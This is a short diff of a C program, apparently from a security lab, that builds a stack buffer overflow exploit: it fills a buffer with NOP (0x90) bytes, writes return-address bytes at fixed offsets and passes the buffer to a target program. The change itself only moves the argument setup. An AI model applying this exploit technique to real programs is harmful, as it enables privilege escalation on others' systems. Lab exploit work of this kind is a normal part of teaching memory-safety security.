@@ -12,9 +12,6 @@ int main(void) {
         char *env[1];
         char exploit[BUFFER_SIZE];
         int i;
-
-        args[0] = TARGET;
-        args[1] = exploit;
         for (i = 0; i < BUFFER_SIZE; i++) {
                 exploit[i] = 0x90;
         }
@@ -34,7 +31,9 @@ int main(void) {
         exploit[65 + 8] = 0xee;
         exploit[66 + 8] = 0x04;
         exploit[67 + 8] = 0x01;
-
+	
+	args[0] = TARGET;
+	args[1] = exploit;
         args[2] = NULL;
         env[0] = NULL;
 
